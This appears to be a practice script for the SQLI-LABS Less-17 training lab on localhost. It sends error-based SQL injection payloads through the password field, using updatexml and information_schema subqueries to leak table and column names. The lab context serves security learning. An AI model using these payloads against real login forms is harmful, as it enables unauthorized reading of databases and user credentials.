# -*- coding: utf-8 -*-
import requests

main_url = "http://localhost:81/SQLI-LABS/sqli-labs-master/Less-17/index.php"

payload = ["select group_concat(table_name) from information_schema.tables where table_schema=database()",  # 爆表
           "select group_concat(column_name) from information_schema.columns where table_name=\'users\'",  # 爆字段
           ]
for i_payload in payload:
    main_payload = {"uname":"admin", "passwd":"admin\' and updatexml(1,concat(0x7e,(" + i_payload + "),0x7e),1)#"}
    response = requests.post(url=main_url, data=main_payload)
    print(response.content)
